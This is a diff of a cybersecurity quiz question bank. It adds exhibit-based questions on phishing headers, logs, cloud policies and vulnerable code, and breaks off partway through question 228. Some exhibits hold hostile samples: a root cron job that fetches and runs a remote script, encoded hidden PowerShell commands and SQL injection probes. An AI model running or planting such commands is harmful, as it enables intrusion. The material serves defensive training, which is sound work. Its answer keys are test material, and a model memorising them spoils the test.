@@ -1,33 +1,39 @@
 /*
- * CyberQuiz question bank (200 questions)
+ * CyberQuiz question bank (250 questions)
  *
  * Required properties:
  * id, rank, topic, difficulty, q, options,
  * correct, why, hint
  *
  * Optional:
- * email (plain text)
+ * exhibit (plain text with line breaks: an email, message headers,
+ * log excerpt, configuration, code or command output that the
+ * question refers to; shown above or beside the question text)
  *
  * Rank levels and number of questions:
- * 0 = Associate     (30 questions)
- * 1 = Professional  (30 questions)
- * 2 = Practitioner  (40 questions)
- * 3 = Architect     (45 questions)
- * 4 = Expert        (55 questions)
- * Total: 200 questions
+ * 0 = Associate     (34 questions)
+ * 1 = Professional  (40 questions)
+ * 2 = Practitioner  (52 questions)
+ * 3 = Architect     (57 questions)
+ * 4 = Expert        (67 questions)
+ * Total: 250 questions
  *
  * Coverage: core security awareness, phishing and social engineering,
  * identity, cloud, cryptography, secure development, incident response,
  * architecture, GRC, AI (LLM) security, malware analysis and
- * penetration testing.
+ * penetration testing, including technical analysis of logs,
+ * email headers, configurations, code and command output.
  *
- * Note: all 200 questions have been checked for uniqueness (ids 1-200,
- * no duplicate or overlapping questions, 200 distinct topic labels).
+ * Exhibits: questions 6-10, 118 and 201-250 include an exhibit
+ * (56 questions in total).
+ *
+ * Note: all 250 questions have been checked for uniqueness (ids 1-250,
+ * no duplicate or overlapping questions, 250 distinct topic labels).
  *
  * Correct-answer positions are balanced across A/B/C/D:
- * A=50, B=50, C=50, D=50 overall.
- * Per rank (A/B/C/D): Associate 8/7/8/7, Professional 7/8/7/8,
- * Practitioner 10/10/10/10, Architect 11/12/11/11, Expert 14/13/14/14.
+ * A=63, B=62, C=63, D=62 overall.
+ * Per rank (A/B/C/D): Associate 9/8/9/8, Professional 10/10/10/10,
+ * Practitioner 13/13/13/13, Architect 14/14/14/15, Expert 17/17/17/16.
  *
  * Answer-length balance: the correct option is the longest in about
  * a quarter of questions and no consistent length pattern identifies it.
@@ -65,13 +71,13 @@ window.CYBERQUIZ_QUESTIONS = [
   {
     id: 5, rank: 0, topic: "Device Encryption", difficulty: "BEGINNER",
     q: "Which action best protects sensitive data stored on a laptop if it is lost or stolen?",
-    options: ["Enable full-disk encryption","Give every colleague an administrator account on the laptop","Save passwords in a plain-text file on the desktop","Disable the screen lock to make access quicker"],
+    options: ["Turn on full-disk encryption before the laptop leaves the office","Give every colleague an administrator account on the laptop","Save passwords in a plain-text file on the desktop","Disable the screen lock to make access quicker"],
     correct: 0, why: "Full-disk encryption helps protect stored data against unauthorised access if a device is lost or stolen.",
     hint: "Consider which control protects the data itself, not just access to the desktop."
   },
   {
     id: 6, rank: 1, topic: "Phishing Triage", difficulty: "INTERMEDIATE",
-    email: "FROM: IT Support <support@company-security.example>\nSUBJECT: Urgent: Your account will be suspended\n\nYour mailbox will be disabled within 30 minutes. Verify your account immediately using the link below to avoid losing access.\n\nLINK: https://company-security.example/verify",
+    exhibit: "FROM: IT Support <support@company-security.example>\nSUBJECT: Urgent: Your account will be suspended\n\nYour mailbox will be disabled within 30 minutes. Verify your account immediately using the link below to avoid losing access.\n\nLINK: https://company-security.example/verify",
     q: "What is the safest response to this email?",
     options: ["Click the link because the message appears to come from the IT Support team","Verify the request through a trusted IT channel and report the email","Reply with your password to confirm your identity","Forward the message to colleagues to check whether they also received it"],
     correct: 1, why: "Urgency and threats of account suspension are common phishing tactics. Verify the request independently and report the suspicious message.",
@@ -79,7 +85,7 @@ window.CYBERQUIZ_QUESTIONS = [
   },
   {
     id: 7, rank: 1, topic: "Payroll Phishing", difficulty: "INTERMEDIATE",
-    email: "FROM: Payroll Team <payroll@company-payroll.example>\nSUBJECT: Action required: Salary payment issue\n\nWe could not process your latest salary payment. Open the attached document and enter your employee login details to release your payment.",
+    exhibit: "FROM: Payroll Team <payroll@company-payroll.example>\nSUBJECT: Action required: Salary payment issue\n\nWe could not process your latest salary payment. Open the attached document and enter your employee login details to release your payment.",
     q: "Which is the strongest warning sign in this message?",
     options: ["It mentions payroll and a problem with processing a salary payment","It was received during normal working hours on a weekday morning","It refers to a payment issue affecting the employee's latest salary","It asks for login details through an unexpected attachment"],
     correct: 3, why: "Unexpected attachments that request credentials can be used to steal login details. Verify the issue with payroll through a trusted channel.",
@@ -87,7 +93,7 @@ window.CYBERQUIZ_QUESTIONS = [
   },
   {
     id: 8, rank: 1, topic: "Document-Sharing Phishing", difficulty: "INTERMEDIATE",
-    email: "FROM: Cloud Storage <sharing@cloud-files.example>\nSUBJECT: A document has been shared with you\n\nA colleague has shared a confidential document. Sign in immediately to review it. The document will be deleted in 10 minutes.\n\nLINK: https://cloud-files.example/document",
+    exhibit: "FROM: Cloud Storage <sharing@cloud-files.example>\nSUBJECT: A document has been shared with you\n\nA colleague has shared a confidential document. Sign in immediately to review it. The document will be deleted in 10 minutes.\n\nLINK: https://cloud-files.example/document",
     q: "What should you do before opening the shared document?",
     options: ["Verify the sharing request through a trusted channel","Sign in immediately to stop the document being deleted","Disable your browser's security protections so the page loads","Enter your credentials because the email mentions a colleague"],
     correct: 0, why: "Unexpected document-sharing messages can be used to steal credentials. Verify the request and access the service through its known official address.",
@@ -95,7 +101,7 @@ window.CYBERQUIZ_QUESTIONS = [
   },
   {
     id: 9, rank: 2, topic: "Business Email Compromise", difficulty: "ADVANCED",
-    email: "FROM: Managing Director <director@company-payments.example>\nSUBJECT: Confidential: Urgent supplier payment\n\nI am in a meeting and cannot take calls. Please transfer £8,750 to the supplier account below today. Keep this confidential until the payment is complete.",
+    exhibit: "FROM: Managing Director <director@company-payments.example>\nSUBJECT: Confidential: Urgent supplier payment\n\nI am in a meeting and cannot take calls. Please transfer £8,750 to the supplier account below today. Keep this confidential until the payment is complete.",
     q: "What is the most appropriate action?",
     options: ["Make the transfer because the request appears to come from a senior executive","Reply to the same email asking whether the payment is really urgent","Transfer a smaller amount first to test whether the account is genuine","Follow payment verification procedures using an independent channel"],
     correct: 3, why: "Business email compromise exploits authority, urgency and secrecy. Verify payment requests independently and follow the organisation's approval procedures.",
@@ -103,7 +109,7 @@ window.CYBERQUIZ_QUESTIONS = [
   },
   {
     id: 10, rank: 2, topic: "Credential Theft", difficulty: "ADVANCED",
-    email: "FROM: Security Notifications <alerts@account-protection.example>\nSUBJECT: Unusual sign-in detected\n\nWe detected an unfamiliar sign-in to your account. Use the link below to review the activity and secure your account. If you do not act now, access may be restricted.\n\nLINK: https://account-protection.example/review",
+    exhibit: "FROM: Security Notifications <alerts@account-protection.example>\nSUBJECT: Unusual sign-in detected\n\nWe detected an unfamiliar sign-in to your account. Use the link below to review the activity and secure your account. If you do not act now, access may be restricted.\n\nLINK: https://account-protection.example/review",
     q: "How should you investigate this notification safely?",
     options: ["Open the link and enter your password so the alert page can confirm the activity","Go to the service through its official app or website and review activity","Ignore every account security notification because most are fake","Send your password to the sender so they can investigate the sign-in"],
     correct: 1, why: "Security alerts can be genuine or fraudulent. Avoid unexpected links and check your account using the official app or a known website address.",
@@ -133,7 +139,7 @@ window.CYBERQUIZ_QUESTIONS = [
   {
     id: 14, rank: 0, topic: "Screen Lock", difficulty: "BEGINNER",
     q: "What is a good practice when stepping away from your work computer?",
-    options: ["Lock the screen","Leave it unlocked if you will be back soon","Write your password on a note","Share your session with a colleague"],
+    options: ["Lock the screen whenever you step away","Leave it unlocked if you will be back soon","Write your password on a note","Share your session with a colleague"],
     correct: 0, why: "Locking the screen helps prevent unauthorised use when you are away.",
     hint: "Prevent someone nearby from using your open session."
   },
@@ -168,7 +174,7 @@ window.CYBERQUIZ_QUESTIONS = [
   {
     id: 19, rank: 0, topic: "Device Security", difficulty: "BEGINNER",
     q: "Why should you avoid installing unknown software on a work device?",
-    options: ["It may contain malware or bypass controls","It always uses too much memory on managed devices","It permanently prevents operating system updates","It makes encryption impossible in every case"],
+    options: ["It may contain malware or bypass organisational controls","It always uses too much memory on managed devices","It permanently prevents operating system updates","It makes encryption impossible in every case"],
     correct: 0, why: "Untrusted software can introduce malware and create security or compliance risks.",
     hint: "Consider the source and permissions of the software."
   },
@@ -210,7 +216,7 @@ window.CYBERQUIZ_QUESTIONS = [
   {
     id: 25, rank: 0, topic: "Password Managers", difficulty: "BEGINNER",
     q: "What is a key benefit of a reputable password manager?",
-    options: ["It makes every account share one convenient password","It prevents every form of account compromise or phishing","It generates and stores unique passwords","It means MFA is no longer useful on any account"],
+    options: ["It makes every account share one convenient password","It prevents every form of account compromise or phishing","It generates and securely stores unique passwords for you","It means MFA is no longer useful on any account"],
     correct: 2, why: "Password managers help users maintain unique, strong passwords without memorising each one.",
     hint: "Focus on unique credentials and secure storage."
   },
@@ -749,7 +755,7 @@ window.CYBERQUIZ_QUESTIONS = [
   {
     id: 102, rank: 0, topic: "Risk Concepts", difficulty: "BEGINNER",
     q: "In cyber security, what does 'risk' describe?",
-    options: ["The chance of harm if a threat exploits a vulnerability","Any software on the network that is out of date or no longer supported","A password that has expired and must be changed by the user","A guaranteed attack on a system that has not been patched"],
+    options: ["The chance of harm if a threat exploits a weakness in an asset","Any software on the network that is out of date or no longer supported","A password that has expired and must be changed by the user","A guaranteed attack on a system that has not been patched"],
     correct: 0, why: "Risk combines the likelihood of a threat exploiting a weakness with the impact if it happens.",
     hint: "Risk is about possibility and consequence, not certainty."
   },
@@ -805,7 +811,7 @@ window.CYBERQUIZ_QUESTIONS = [
   {
     id: 110, rank: 0, topic: "Pentesting Ethics", difficulty: "BEGINNER",
     q: "What must a penetration tester have before starting a test?",
-    options: ["Written authorisation that defines the scope","Verbal approval from any employee who works at the target","A copy of the target's administrator passwords","Nothing, as long as the aim is to help the organisation"],
+    options: ["Written authorisation from the owner that defines the scope","Verbal approval from any employee who works at the target","A copy of the target's administrator passwords","Nothing, as long as the aim is to help the organisation"],
     correct: 0, why: "Testing without clear written permission and scope can be illegal and may cause harm to systems that were never meant to be tested.",
     hint: "Good intentions do not replace permission."
   },
@@ -860,7 +866,7 @@ window.CYBERQUIZ_QUESTIONS = [
   },
   {
     id: 118, rank: 1, topic: "Malicious Documents", difficulty: "INTERMEDIATE",
-    email: "FROM: Accounts <invoices@supplier-billing.example>\nSUBJECT: Overdue invoice\n\nPlease see the attached invoice. If the document appears blank, click 'Enable Content' to view it.",
+    exhibit: "FROM: Accounts <invoices@supplier-billing.example>\nSUBJECT: Overdue invoice\n\nPlease see the attached invoice. If the document appears blank, click 'Enable Content' to view it.",
     q: "Why is the instruction to 'Enable Content' a warning sign?",
     options: ["It is always required before any document can be read safely","It only changes how the document looks on screen","Enabling content can let embedded macros run and fetch more malware","It automatically scans the file for known threats first"],
     correct: 2, why: "Malicious documents often rely on macros or active content to execute code once the user enables it.",
@@ -1439,5 +1445,405 @@ window.CYBERQUIZ_QUESTIONS = [
     options: ["Let every team apply whichever controls it prefers because each provider is different","Standardise on the weakest provider's features so that nothing differs between clouds","Avoid monitoring any cloud to prevent differences from being noticed by auditors or regulators","Common policies, central visibility and provider-specific guardrails owned by a platform team"],
     correct: 3, why: "A shared policy and visibility layer, implemented through provider-specific guardrails, keeps controls consistent despite platform differences.",
     hint: "Consistent outcomes need common policy, not identical tools."
+  },
+  {
+    id: 201, rank: 0, topic: "Lookalike Domains", difficulty: "BEGINNER",
+    exhibit: "REAL SITE: https://www.examplebank.com",
+    q: "Which of these web addresses is most likely a fake version of the bank's real site?",
+    options: ["https://www.examplebank.com/login","https://www.examp1ebank.com/login","https://online.examplebank.com/accounts","https://examplebank.com/help"],
+    correct: 1, why: "Attackers register lookalike domains that swap similar characters, such as the digit 1 for the letter l, hoping people will not notice.",
+    hint: "Read the domain name character by character."
+  },
+  {
+    id: 202, rank: 0, topic: "Double File Extensions", difficulty: "BEGINNER",
+    exhibit: "ATTACHMENT: Invoice_4471.pdf.exe\nSIZE: 1.2 MB\nFROM: accounts@supplier-billing.example",
+    q: "What does this attachment name suggest?",
+    options: ["A normal PDF document that can be opened safely in any common PDF reader","A scanned image of the invoice that is safe to open on any mobile phone","A compressed archive that cannot run any code when it is opened","An executable program disguised as a PDF using a double extension"],
+    correct: 3, why: "Windows may hide the final extension, so a program ending in .exe can look like a document. Only the last extension decides what the file is.",
+    hint: "The last extension is the one that counts."
+  },
+  {
+    id: 203, rank: 0, topic: "Certificate Warnings", difficulty: "BEGINNER",
+    exhibit: "BROWSER MESSAGE: Your connection is not private\nERROR: NET::ERR_CERT_COMMON_NAME_INVALID\nSITE: hr-portal.company.example\nCERTIFICATE ISSUED TO: *.other-host.example",
+    q: "You see this browser warning when opening the company HR portal. What should you do?",
+    options: ["Stop, do not enter your credentials and report it to IT so the certificate can be checked","Click 'Proceed anyway' because you recognise the portal's name","Turn off the browser's security warnings in the settings menu","Try again on a different Wi-Fi network and ignore the message"],
+    correct: 0, why: "A name mismatch can mean the site is misconfigured or that someone is intercepting the connection, so credentials should not be entered until IT has checked.",
+    hint: "A warning on a login page is a reason to stop."
+  },
+  {
+    id: 204, rank: 0, topic: "Link Hover Check", difficulty: "BEGINNER",
+    exhibit: "EMAIL BODY: Click here to view your invoice\nLINK TEXT: Click here to view your invoice\nSTATUS BAR ON HOVER: http://198.51.100.23/invoice.php",
+    q: "What does the link's real destination suggest?",
+    options: ["The link is safe because invoices are normally delivered as PHP files by suppliers","The link text and real destination match, so the message can be trusted","The destination is a bare IP address, not the sender's site","The link is encrypted end to end so the sender's identity is already proven"],
+    correct: 2, why: "A link that leads to a raw IP address instead of the sender's own domain is a common sign of a malicious or compromised destination.",
+    hint: "Compare where the link claims to go with where it really goes."
+  },
+  {
+    id: 205, rank: 1, topic: "Email Header Analysis", difficulty: "INTERMEDIATE",
+    exhibit: "FROM: Parcel Service <noreply@parcel-delivery.example>\nREPLY-TO: refunds@mail-collect.example\nSUBJECT: Redelivery fee required\nRECEIVED-FROM: mail.shipping-update.example (203.0.113.45)\nSPF: fail (smtp.mailfrom=billing@shipping-update.example)\nDKIM: none\nDMARC: fail (p=none, header.from=parcel-delivery.example)\n\nYour parcel could not be delivered. Pay a £1.99 redelivery fee within 24 hours.\n\nLINK: https://parcel-fee.example/pay",
+    q: "Based on these message headers, what is the best assessment?",
+    options: ["Legitimate, because the display name and From address appear to belong to the parcel service","Legitimate but low risk, because the DMARC policy is none so the message was accepted","Likely spoofed: SPF and DMARC failed, there is no DKIM and the Reply-To differs","Cannot be assessed unless someone opens the attachment"],
+    correct: 2, why: "SPF and DMARC failures, no DKIM signature and a Reply-To on an unrelated domain point to a spoofed message. A p=none policy only means the failure was not enforced.",
+    hint: "Check authentication results and whether the reply address matches the sender."
+  },
+  {
+    id: 206, rank: 1, topic: "Windows Logon Events", difficulty: "INTERMEDIATE",
+    exhibit: "WINDOWS SECURITY LOG (excerpt)\n4625 FAILED logon  user=administrator  src=198.51.100.77  type=3  (212 times in 4 minutes)\n4625 FAILED logon  user=admin  src=198.51.100.77  type=3\n4625 FAILED logon  user=backup  src=198.51.100.77  type=3\n4624 SUCCESS logon user=backup  src=198.51.100.77  type=3",
+    q: "What is the most likely activity and the best first response?",
+    options: ["A password-guessing attack that has succeeded for 'backup'; disable the account, block the source and investigate that session","Normal user lockouts; reset every password tomorrow","A scheduled backup job; no action is needed","A denial-of-service attack; add network bandwidth"],
+    correct: 0, why: "Many failed network logons from one source followed by a success on one of the guessed accounts indicates a successful brute-force or spraying attempt that needs containment.",
+    hint: "Look at what happens right after the burst of failures."
+  },
+  {
+    id: 207, rank: 1, topic: "SSH Brute Force", difficulty: "INTERMEDIATE",
+    exhibit: "LINUX /var/log/auth.log (excerpt)\nFailed password for invalid user oracle from 203.0.113.9 port 51022 ssh2\nFailed password for invalid user test from 203.0.113.9 port 51030 ssh2\nFailed password for root from 203.0.113.9 port 51041 ssh2\n(repeats about 600 times in 10 minutes)",
+    q: "Which control best reduces this risk on an internet-facing server?",
+    options: ["Move the server to a larger virtual machine so that it can handle the extra login attempts","Increase the log retention period to 90 days","Rename the root account only","Disable SSH password logins, use keys and block repeated failures"],
+    correct: 3, why: "Key-based authentication removes the value of password guessing, and automatic blocking limits the noise and the chance of a lucky guess.",
+    hint: "Remove the thing the attacker is guessing."
+  },
+  {
+    id: 208, rank: 1, topic: "Web Log Analysis", difficulty: "INTERMEDIATE",
+    exhibit: "WEB SERVER ACCESS LOG (excerpt)\n203.0.113.50 \"GET /products?id=7 HTTP/1.1\" 200 5123\n203.0.113.50 \"GET /products?id=7' OR '1'='1 HTTP/1.1\" 500 312\n203.0.113.50 \"GET /products?id=7 UNION SELECT NULL,NULL-- HTTP/1.1\" 500 298",
+    q: "What does this web server activity most likely represent?",
+    options: ["Normal customers browsing the catalogue through a mobile application","SQL injection probing of the id parameter","A misconfigured load balancer sending malformed health checks to the site","A harmless search engine crawler indexing the product pages in order"],
+    correct: 1, why: "Quote characters, OR conditions and UNION SELECT in a parameter, followed by server errors, are classic signs of SQL injection probing.",
+    hint: "Look at what has been added to the id value."
+  },
+  {
+    id: 209, rank: 1, topic: "SPF Record Review", difficulty: "INTERMEDIATE",
+    exhibit: "DNS TXT RECORD\nv=spf1 include:_spf.mailvendor.example +all",
+    q: "What is the problem with this SPF record?",
+    options: ["+all authorises any server to send as the domain, so SPF protects nothing","SPF records must never include any third-party mail vendor under any circumstances","The record should be published as an A record rather than as a TXT record at the root","The v=spf1 prefix is only required for senders that use IPv6"],
+    correct: 0, why: "The +all mechanism passes every sender, which defeats the purpose of SPF. A restrictive ending such as -all or ~all is normally used.",
+    hint: "Look at the last mechanism in the record."
+  },
+  {
+    id: 210, rank: 1, topic: "Outbound Traffic Review", difficulty: "INTERMEDIATE",
+    exhibit: "FIREWALL LOG (allowed outbound)\n10.0.4.22 -> 203.0.113.80:4444 TCP 7 MB sent 02:13\n10.0.4.22 -> 203.0.113.80:4444 TCP 6 MB sent 02:43\n10.0.4.22 -> 203.0.113.80:4444 TCP 7 MB sent 03:13",
+    q: "A workstation sends similar volumes to the same external host every 30 minutes overnight. What is the best next step?",
+    options: ["Ignore it, because the traffic was allowed by the firewall policy so it must be legitimate","Block its MAC address and close the ticket","Isolate the host and investigate the process and destination","Restart the firewall to clear its state tables"],
+    correct: 2, why: "Regular, automated transfers to an unusual port at night are consistent with beaconing or exfiltration, so the host should be contained and examined.",
+    hint: "Regular timing is a clue."
+  },
+  {
+    id: 211, rank: 1, topic: "Hash Intelligence Match", difficulty: "INTERMEDIATE",
+    exhibit: "EDR ALERT\nSHA-256: 9f2c4e7a...a41e\nHOSTS: LAPTOP-014, LAPTOP-027, LAPTOP-033\nTHREAT INTELLIGENCE VERDICT: known infostealer",
+    q: "What should the analyst do first?",
+    options: ["Delete the file on each laptop and close the alert","Isolate the three laptops, collect the file and process data, check for stolen credentials and reset the affected accounts","Wait for the antivirus product to quarantine the file on its own","Email the hash to all staff and ask them to search their devices"],
+    correct: 1, why: "An infostealer has probably already taken credentials, so responders should contain the hosts, gather evidence and reset exposed accounts rather than only deleting the file.",
+    hint: "Assume the credentials may already be gone."
+  },
+  {
+    id: 212, rank: 1, topic: "CVSS Vector Reading", difficulty: "INTERMEDIATE",
+    exhibit: "SCANNER FINDING\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    q: "What does this CVSS vector tell you?",
+    options: ["It needs physical access and an authenticated user to click a link before it works","It affects only confidentiality and can be ignored if the host is patched monthly","It is a local-only vulnerability that requires administrator rights to trigger it","Network-exploitable, low complexity, no privileges or user interaction needed"],
+    correct: 3, why: "AV:N means network attack vector, AC:L low complexity, PR:N and UI:N no privileges or user action, with high impact on confidentiality, integrity and availability.",
+    hint: "Read AV, AC, PR and UI first."
+  },
+  {
+    id: 213, rank: 1, topic: "Deceptive Link Domains", difficulty: "INTERMEDIATE",
+    exhibit: "FROM: Microsoft 365 Team <no-reply@m365-notify.example>\nSUBJECT: Password expires today\n\nYour password expires in 2 hours. Select the link below to keep your current password.\n\nLINK TEXT: https://login.microsoftonline.com\nLINK TARGET: https://login.microsoftonline.com.secure-verify.example/session",
+    q: "Why is the link in this email dangerous even though the visible text shows a genuine Microsoft address?",
+    options: ["The registered domain is secure-verify.example; the Microsoft name is only a subdomain","The visible text is too short to be a valid address, so the browser will block the page automatically","Links inside emails always download a file instead of opening a web page","The link uses HTTPS, and HTTPS pages are always fake"],
+    correct: 0, why: "The part of the address just before the final domain suffix decides who controls the site. Here that is secure-verify.example, not Microsoft.",
+    hint: "Read the address from right to left."
+  },
+  {
+    id: 214, rank: 1, topic: "TLS Configuration Review", difficulty: "INTERMEDIATE",
+    exhibit: "TLS SCAN REPORT\nProtocols: TLS 1.0, TLS 1.1, TLS 1.2\nCipher suites include RC4 and 3DES\nCertificate: valid, SHA-256, expires in 11 months",
+    q: "What is the key finding in this TLS scan report?",
+    options: ["The certificate expires in eleven months, which is far too soon to be acceptable","TLS 1.2 should be turned off first","Disable TLS 1.0/1.1 and weak ciphers such as RC4 and 3DES","The SHA-256 signature algorithm on the certificate is considered insecure"],
+    correct: 2, why: "TLS 1.0 and 1.1 and ciphers such as RC4 and 3DES are deprecated or weak, while the certificate itself is healthy.",
+    hint: "Separate the certificate from the protocol and cipher settings."
+  },
+  {
+    id: 215, rank: 2, topic: "Office Spawning PowerShell", difficulty: "ADVANCED",
+    exhibit: "EDR PROCESS TREE\nOUTLOOK.EXE\n  WINWORD.EXE (invoice.docm)\n    cmd.exe /c powershell -enc JABzAD0A...\n      powershell.exe (outbound connection to 203.0.113.99:443)",
+    q: "What is the most likely explanation and best immediate action for this process tree?",
+    options: ["A normal document-processing task, so the alert can be closed without further investigation","A document that refreshes itself, so the file should be added to the allowlist","Antivirus scanning the attachment, so the analyst should wait for it to finish","A malicious macro launching PowerShell; isolate and preserve evidence"],
+    correct: 3, why: "An Office document spawning a command shell that runs encoded PowerShell and connects outbound is a classic malicious-macro chain and warrants containment.",
+    hint: "Think about what Word should never need to launch."
+  },
+  {
+    id: 216, rank: 2, topic: "Encoded Command Analysis", difficulty: "ADVANCED",
+    exhibit: "COMMAND LINE OBSERVED ON A SERVER\npowershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0A...",
+    q: "Which step best helps an analyst understand this command safely?",
+    options: ["Paste the encoded string into a public website that will run the command and show its output","Decode the Base64 text in an isolated environment and review the script","Run it again on the server with logging turned off","Delete the parent process without examining it first"],
+    correct: 1, why: "The payload can be decoded and read without executing it, ideally in an isolated analysis environment, so that behaviour is understood without risk.",
+    hint: "Read it; do not run it."
+  },
+  {
+    id: 217, rank: 2, topic: "Kerberos Ticket Requests", difficulty: "ADVANCED",
+    exhibit: "DOMAIN CONTROLLER SECURITY LOG (excerpt)\nEvent 4769 (Kerberos service ticket requested) Account: jsmith Service: MSSQLSvc/db01 Ticket encryption: 0x17 (RC4)\n(45 similar requests for different service accounts within 2 minutes, all from one workstation)",
+    q: "What does this pattern of Kerberos ticket requests most likely indicate?",
+    options: ["Service-ticket requests for many service accounts using RC4, consistent with Kerberoasting; investigate the workstation and review service-account passwords","Normal user authentication to file shares","A time-synchronisation problem on the workstation","Password expiry notifications being sent to users"],
+    correct: 0, why: "A burst of service-ticket requests for many service accounts using the weaker RC4 type suggests an attempt to harvest tickets for offline cracking.",
+    hint: "Look at the number of different services requested in a short time."
+  },
+  {
+    id: 218, rank: 2, topic: "Over-Permissive IAM Policy", difficulty: "ADVANCED",
+    exhibit: "IAM POLICY (web application role)\n{\"Effect\":\"Allow\",\"Action\":\"s3:*\",\"Resource\":\"*\"}",
+    q: "The application only reads objects from one bucket named reports-prod. What is the best change to this policy?",
+    options: ["Add a condition so that the role can only be used during weekday working hours","Keep the policy as it is and enable MFA delete on every bucket in the account","Limit it to s3:GetObject on the reports-prod bucket only","Move the application to a larger instance type"],
+    correct: 2, why: "Least privilege means granting only the read action on the one bucket the application needs, rather than every S3 action on every resource.",
+    hint: "Match the permission to what the application really does."
+  },
+  {
+    id: 219, rank: 2, topic: "Public Bucket Policy", difficulty: "ADVANCED",
+    exhibit: "STORAGE BUCKET POLICY (excerpt)\n\"Principal\": \"*\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::hr-exports/*\"",
+    q: "What is the issue with this bucket policy?",
+    options: ["The policy blocks every user, including administrators, from reading the objects","Any anonymous internet user can read every object","The policy allows only users in the same account to read the objects in the bucket","The policy only allows uploads, so reads are impossible for all of the users"],
+    correct: 1, why: "A wildcard principal with GetObject on the bucket's objects makes them readable by anyone on the internet unless other controls block it.",
+    hint: "What does Principal * mean?"
+  },
+  {
+    id: 220, rank: 2, topic: "External Scan Triage", difficulty: "ADVANCED",
+    exhibit: "EXTERNAL SCAN RESULTS\n22/tcp open ssh (key authentication only)\n80/tcp open http (redirects to 443)\n443/tcp open https\n9200/tcp open elasticsearch (no authentication required)",
+    q: "Which finding in these scan results is the most urgent?",
+    options: ["SSH is open, which means the server is certain to be compromised within the day","HTTPS on port 443 is open, which proves the server has been breached","Port 80 is open, so the whole website must be taken offline","Unauthenticated Elasticsearch exposed to the internet, risking data exposure"],
+    correct: 3, why: "An internet-exposed data store with no authentication can allow anyone to read or modify data, whereas the other services are normal or protected.",
+    hint: "Which service lets anyone in without credentials?"
+  },
+  {
+    id: 221, rank: 2, topic: "JWT Algorithm Validation", difficulty: "ADVANCED",
+    exhibit: "JWT HEADER (decoded): {\"alg\":\"none\",\"typ\":\"JWT\"}\nSIGNATURE: (empty)\nAPI RESPONSE: 200 OK (access granted)",
+    q: "What is the vulnerability and the fix?",
+    options: ["Tokens are too short, so they should be made longer","The server should send tokens over HTTP instead of HTTPS","The server accepts unsigned tokens; it should enforce a fixed set of allowed algorithms and always verify the signature","The typ field must be set to JWS for the token to be valid"],
+    correct: 2, why: "Accepting alg=none lets anyone forge tokens. The server must decide which algorithms are allowed and verify signatures rather than trusting the token's header.",
+    hint: "Who decides how the token is verified?"
+  },
+  {
+    id: 222, rank: 2, topic: "CORS Misconfiguration", difficulty: "ADVANCED",
+    exhibit: "HTTP RESPONSE HEADERS (api.company.example)\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true\nNOTE: the origin value is copied from the request's Origin header",
+    q: "What is the risk of these response headers?",
+    options: ["Any website can read authenticated responses on behalf of logged-in users","Browsers will refuse every request to the API, making it unavailable to all users","Cookies will never be sent by browsers, so users cannot stay logged in at all","The response will be cached forever by every browser"],
+    correct: 0, why: "Reflecting any origin while allowing credentials lets a malicious site make authenticated requests and read the results from a victim's browser.",
+    hint: "The server is trusting whatever origin asks."
+  },
+  {
+    id: 223, rank: 2, topic: "SQL Injection Remediation", difficulty: "ADVANCED",
+    exhibit: "CODE (excerpt)\nquery = \"SELECT * FROM users WHERE name = '\" + username + \"' AND active = 1\"",
+    q: "Which change best removes the vulnerability in this code?",
+    options: ["Strip every space character from the username before building the query string","Convert the username to lowercase","Hide the database error messages from the user","Use parameterised queries so input is treated as data"],
+    correct: 3, why: "Parameterised queries keep user input separate from SQL code, which prevents it from altering the query structure.",
+    hint: "Keep data and code apart."
+  },
+  {
+    id: 224, rank: 2, topic: "YARA Rule Limits", difficulty: "ADVANCED",
+    exhibit: "YARA RULE (excerpt)\nstrings:\n  $a = \"AutoOpen\"\n  $b = \"powershell\" nocase\ncondition:\n  all of them",
+    q: "Which limitation should the analyst expect from this YARA rule?",
+    options: ["It can miss obfuscation and match legitimate files, so test it","It will detect every malicious document in existence without any false positives","It scans network traffic in real time and will block any connection it matches","It automatically removes the macros from any document that it flags"],
+    correct: 0, why: "String-based rules are easy to evade with obfuscation and can match benign files, so they need testing against clean and malicious samples.",
+    hint: "Simple string rules are brittle."
+  },
+  {
+    id: 225, rank: 2, topic: "Cron Persistence", difficulty: "ADVANCED",
+    exhibit: "FILE: /etc/cron.d/sysupdate (created after the intrusion)\n*/5 * * * * root curl -s http://203.0.113.9/u.sh | sh",
+    q: "You find this file on a compromised web server. What is the correct interpretation?",
+    options: ["A standard security update job installed by the operating system distribution package","A log rotation entry that was installed by the web server software package earlier","A persistence mechanism that fetches and runs remote code every five minutes","A scheduled backup of the database to remote storage"],
+    correct: 2, why: "A root cron job that repeatedly downloads and pipes a remote script into a shell is a persistence and remote-execution mechanism.",
+    hint: "Look at what runs and how often."
+  },
+  {
+    id: 226, rank: 2, topic: "DNS Beaconing", difficulty: "ADVANCED",
+    exhibit: "DNS QUERY LOG (one host, domain update.cdn-sync.example)\n02:00:01  TXT  a8f3k2x9q1...update.cdn-sync.example\n02:05:02  TXT  p0z7m4c8w2...update.cdn-sync.example\n02:10:01  TXT  h5t1v6b3n9...update.cdn-sync.example\n(continues every 5 minutes, 24 hours a day)",
+    q: "What is the most likely explanation for this DNS activity?",
+    options: ["A user refreshing a web page every few minutes","Automated beaconing or DNS tunnelling to the domain; block it and investigate the host","A scheduled backup job reporting its status","Normal time-synchronisation traffic"],
+    correct: 1, why: "Regular timing and long random-looking subdomains in TXT queries suggest data being carried or commands being polled over DNS.",
+    hint: "Regular intervals and long random labels are unusual."
+  },
+  {
+    id: 227, rank: 3, topic: "Security Group Exposure", difficulty: "EXPERT",
+    exhibit: "TERRAFORM (excerpt)\nresource \"aws_security_group_rule\" \"db\" {\n  type        = \"ingress\"\n  from_port   = 5432\n  to_port     = 5432\n  protocol    = \"tcp\"\n  cidr_blocks = [\"0.0.0.0/0\"]\n}",
+    q: "How should the architect fix this security group rule?",
+    options: ["Change the protocol to UDP so that the rule no longer matches PostgreSQL traffic","Allow 0.0.0.0/0 only during business hours using a scheduled security group rule","Rename the resource to make it less obvious to scanners","Allow only the application tier's security group and keep the database private"],
+    correct: 3, why: "Databases should accept connections only from the tiers that need them and should not sit on a publicly reachable network.",
+    hint: "Limit who may connect, not when."
+  },
+  {
+    id: 228, rank: 3, topic: "Container Image Hygiene", difficulty: "EXPERT",
